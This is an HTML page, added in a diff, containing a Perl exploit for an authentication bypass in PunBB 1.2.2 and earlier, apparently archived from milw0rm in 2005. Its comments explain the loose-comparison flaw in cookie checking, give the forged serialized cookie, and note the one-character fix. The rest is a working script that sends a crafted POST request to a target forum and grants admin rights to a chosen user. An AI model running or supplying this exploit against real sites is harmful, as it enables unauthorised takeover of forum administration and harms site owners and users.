@@ -1,0 +1,94 @@
+<html>
+<head>
+<title>PunBB version <= 1.2.2 Authentication Bypass Exploit</title>
+<pre>
+#!/usr/bin/perl
+use IO::Socket;
+
+#
+#   PunBB version &lt;= 1.2.2 auth bypass exploit
+#
+# -------------------------------------------------
+# About vuln:
+# lets look file /include/functions.php
+# ### code start ###
+# function check_cookie(&amp;$pun_user)
+# {
+# ...
+# if (isset($_COOKIE[$cookie_name]))
+# list($cookie['user_id'], $cookie['password_hash']) = @unserialize($_COOKIE[$cookie_name]);
+#
+# if ($cookie['user_id'] &gt; 1)
+# {
+# // Check if there's a user with the user ID and password hash from the cookie
+# $result = $db-&gt;query('SELECT .... tra-la-la... );
+# $pun_user = $db-&gt;fetch_assoc($result);
+# 
+# // If user authorisation failed
+# if (!isset($pun_user['id']) || md5($cookie_seed.$pun_user['password']) != $cookie['password_hash'])
+# ...                                                                    ^^^ HERE !!!
+# ### code end ###
+# and we can logging with any user id if we use boolean value in cookie password_hash 
+# evil cookie is : a:2:{i:0;s:1:&quot;2&quot;;i:1;b:1;} where 2 is user id
+# 
+# fix:
+# if (!isset($pun_user['id']) || md5($cookie_seed.$pun_user['password']) != $cookie['password_hash'])
+# change to
+# if (!isset($pun_user['id']) || md5($cookie_seed.$pun_user['password']) !== $cookie['password_hash'])
+# -------------------------------------------------
+# (c)oded by 1dt.w0lf // 09.03.2005 // r57 // www.rst.void.ru
+# -------------------------------------------------
+# example:
+# r57punbb.pl nerf.ru /forum/ 2 47
+# + Exploit success!
+# + Group membership saved!
+# + Now user with id=47 have admin level!
+# ja-ja-ja dast ist fantastish =)
+# ------------------------------------------------
+
+$server    = $ARGV[0];
+$folder    = $ARGV[1];
+$admin_uid = $ARGV[2];
+$user_uid  = $ARGV[3];
+$suc = 0;
+if (@ARGV &lt; 4 || $admin_uid =~ /[^\d]/ || $user_uid =~ /[^\d]/)
+{
+ print q{
+       PunBB version &lt;= 1.2.2 auth bypass exploit 
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ usage: r57punbb.pl [host] [/folder/] [admin_id] [user_id]
+
+ [host]     - hostname where punbb installed
+ [/folder/] - folder where punbb installed
+ [admin_id] - id of user who have admin rights
+ [user_id]  - user with this id get admin level after 
+              success exploiting
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ r57 private code // rst.void.ru
+ };
+ exit();
+}
+$server =~ s/^((?:http:\/\/)*)([^\/]*)(\/*)$/$2/;
+$str    = 'Group membership saved';
+$cook   = 'a:2:{i:0;s:'.length($admin_uid).':&quot;'.$admin_uid.'&quot;;i:1;b:1;}';
+$data   = 'form_sent=1&amp;group_id=1&amp;update_group_membership=Save';
+$cook   =~ s/(.)/&quot;%&quot;.uc(sprintf(&quot;%2.2x&quot;,ord($1)))/eg;
+
+$socket = IO::Socket::INET-&gt;new( Proto =&gt; &quot;tcp&quot;, PeerAddr =&gt; &quot;$server&quot;, PeerPort =&gt; &quot;80&quot;) || die &quot;$socket error $!&quot;;
+print $socket &quot;POST ${folder}profile.php?section=admin&amp;id=$user_uid&amp;action=foo HTTP/1.0\n&quot;;
+print $socket &quot;Host: $server\n&quot;;
+print $socket &quot;Referer: http://$server${folder}profile.php?section=admin&amp;id=$user_uid\n&quot;;
+print $socket &quot;Cookie: punbb_cookie=$cook\n&quot;;
+print $socket &quot;Content-Type: application/x-www-form-urlencoded\n&quot;;
+print $socket &quot;Content-Length: &quot;.length($data).&quot;\n\n&quot;;
+print $socket &quot;$data\n\n&quot;;
+while(&lt;$socket&gt;){ if(/$str/) { $suc = 1; last; } }
+($suc)?(print &quot;+ Exploit success!\n+ $str!\n+ Now user with id=$user_uid have admin level!\n&quot;)
+      :(print &quot;- Exploit failed\n&quot;)
+      
+#--- EOF ---
+
+# milw0rm.com [2005-03-29]
+</pre>
+</html>
+
